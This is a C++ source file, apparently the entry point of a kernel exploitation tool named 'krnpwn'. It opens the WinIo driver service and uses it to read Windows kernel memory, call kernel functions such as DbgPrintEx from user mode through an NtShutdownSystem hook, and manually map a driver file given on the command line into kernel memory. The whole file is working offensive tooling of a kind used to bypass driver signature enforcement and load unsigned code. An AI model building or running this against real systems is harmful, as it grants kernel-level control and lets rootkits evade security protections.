#include <memory>
#include <fstream>

#include "krnpwn/krnpwn.hpp"

#include "krnpwn/functions/mapper/mapper.hpp"

#include "util/log.hpp"
#include "util/WinSysInfoQuery.hpp"


void demo( std::shared_ptr< krnpwn::krnpwn > pwn )
{
    log_info( "reading ntoskrnl DOS header using kernel virtual address..." );

    auto ntoskrnl_base = native::find_kernel_module( "ntoskrnl.exe" );

    log_info( "ntoskrnl base:", std::hex, ntoskrnl_base );

    auto ntoskrnl_dos = pwn->read_km< IMAGE_DOS_HEADER >( ntoskrnl_base );

    log_info( "ntoskrnl magic:", std::hex, ntoskrnl_dos.e_magic, "\n" );

    log_info( "calling DbgPrint" );

    auto dbg_print_proc = native::find_kernel_export( "ntoskrnl.exe", "DbgPrintEx" );

    using dbg_print_fn = uint32_t( __stdcall* )( uint32_t, uint32_t, const char* );

    auto kernel_debug = pwn->kcall< dbg_print_fn >(
        dbg_print_proc,
        77 /* DPFLTR_IHVDRIVER_ID */,
        0  /* DPFLTR_ERROR_LEVEL */,
        "called from usermode using NtShutdownSystem hook\n"
        );

    log_dbg( "DbgPrint ret:", std::hex, kernel_debug, "\n" );
}

int main( int argc, char* argv[] )
{
    auto pwn = std::make_shared< krnpwn::krnpwn >();

    auto winio = std::make_shared<krnpwn::krnpwn_winio64>();


    if( argc < 3 )
    {
        std::cout <<
            "Usage: KRNPWN.exe <driver> <function> <args>\n\n"
            "Drivers:\n"
            "\twinio\n\n"
            "Functions:\n"
            "\tmap <filename>\n"
            "\tdemo - no args\n\n";

        return -1;
    }

    if( strcmp( argv[ 1 ], "winio" ) == 0 )
    {
        if( winio->open_service() )
        {
            log_info( winio->get_service_name(), "initalised", "\n" );

            pwn->initalise( winio );
        }
        else
        {
            log_err( "failed to load", winio->get_service_name() );
            return -1;
        }
    }
    

    if( pwn->is_initalised() )
    {
        if( strcmp( argv[ 2 ], "demo" ) == 0 )
        {
            demo( pwn );
        }
        else if( strcmp( argv[ 2 ], "map" ) == 0 )
        {
            if( argc < 4 )
            {
                log_err( "no filename provided!" );
                return -1;
            }

            std::vector< uint8_t > image;
            std::ifstream file( argv[ 3 ], std::ios::binary );

            if( !file )
            {
                log_err( "failed to open", argv[ 3 ] );
                return -1;
            }

            image.assign( std::istreambuf_iterator< char >( file ), std::istreambuf_iterator< char >() );

            file.close();

            mapper map( pwn );

            if( map.map_image( image ) )
            {
                log_info( "driver is mapped into memory" );
                log_info( "image_base :", std::hex, map.get_image_base() );
                log_info( "entry_point:", std::hex, map.get_entry_point() );
            }
            else
            {
                log_err( "failed to map driver" );
                return -1;
            }
        }
    }
    else
    {
        log_err( "failed to initalise krnpwn!" );
        return -1;
    }

    return 0;
}